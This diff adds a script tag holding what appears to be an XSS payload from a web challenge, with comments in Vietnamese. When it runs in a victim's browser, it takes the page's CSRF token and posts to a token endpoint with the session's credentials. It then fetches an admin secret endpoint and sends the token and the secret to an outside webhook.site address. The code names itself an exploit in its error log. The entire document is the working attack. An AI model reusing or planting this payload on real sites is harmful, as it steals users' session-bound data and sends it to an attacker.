@@ -1,0 +1,47 @@
+<script>
+(async () => {
+  try {
+    // 1. Lấy CSRF token từ meta hoặc bỏ nếu không cần
+    const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
+
+    // 2. Gửi POST để tạo token
+    const tokenRes = await fetch('/generate-token', {
+      method: 'POST',
+      headers: {
+        'X-CSRF-TOKEN': csrf,
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      },
+      credentials: 'include'
+    });
+
+    const tokenData = await tokenRes.json();
+    const token = tokenData.token;
+
+    // 3. Gửi GET để lấy dữ liệu bảo vệ bằng token
+    const secretRes = await fetch('/api/admin/sup3rs3cr3t', {
+      method: 'GET',
+      headers: {
+        'Authorization': 'Bearer ' + token,
+        'Accept': 'application/json'
+      },
+      credentials: 'include'
+    });
+
+    const secretData = await secretRes.text();
+
+    // 4. Gửi dữ liệu về webhook
+    await fetch('https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        token: token,
+        secret: secretData
+      })
+    });
+  } catch (e) {
+    // Tùy chọn: log lỗi
+    console.error('Exploit error:', e);
+  }
+})();
+</script>
